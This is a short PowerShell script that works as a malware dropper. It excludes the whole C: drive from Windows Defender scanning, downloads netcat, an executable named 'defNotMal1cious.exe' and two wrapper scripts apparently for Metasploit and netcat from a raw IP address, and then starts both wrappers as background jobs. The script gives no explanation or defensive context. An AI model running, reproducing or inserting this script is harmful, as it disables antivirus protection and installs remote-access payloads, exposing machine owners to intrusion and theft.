Add-MpPreference -ExclusionPath "C:\";
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/nc.exe -OutFile C:/nc.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/defNotMal1cious.exe -OutFile C:/defNotMalicious.exe;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperMSF.ps1 -OutFile C:/windowsWrapperMSF.ps1;
Invoke-WebRequest http://64.227.19.44/content/dlj23jjoj233jjajdeqo/windowsWrapperNC.ps1 -OutFile C:/windowsWrapperNC.ps1;
Start-Job -ScriptBlock {C:/windowsWrapperMSF.ps1};
Start-Job -ScriptBlock {C:/windowsWrapperNC.ps1};
